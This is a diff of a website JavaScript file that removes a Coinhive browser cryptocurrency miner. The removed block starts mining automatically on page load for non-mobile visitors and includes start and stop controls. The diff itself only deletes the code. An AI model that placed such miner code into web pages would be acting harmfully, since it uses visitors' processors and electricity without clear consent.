@@ -40,38 +40,3 @@ function menuClick() {
 
 menuClick();
 
-//******************************************************************************************* */
-//Coinhive scripts
-var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log', {
-    throttle: 0.6,
-    theme: 'light'
-});
-
-console.log("Out");
-// Only start on non-mobile devices
-if (typeof miner !== 'undefined') {
-    console.log("in");
-    if (window.sessionStorage["minerStarted"] != false)
-        startMine();
-}
-
-
-function startMine() {
-    console.log("start2");
-    if (typeof miner !== 'undefined' && !miner.isMobile() && !miner.isRunning()) {
-        miner.start();
-        window.sessionStorage["minerStarted"] = miner.isRunning();
-        if (document.getElementById('stop_mine'))
-            document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
-    }
-}
-
-function stopMine() {
-    console.log("stop2");
-    if (typeof miner !== 'undefined' && miner.isRunning()) {
-        miner.stop();
-        window.sessionStorage["minerStarted"] = miner.isRunning();
-        if (document.getElementById('stop_mine'))
-            document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
-    }
-}
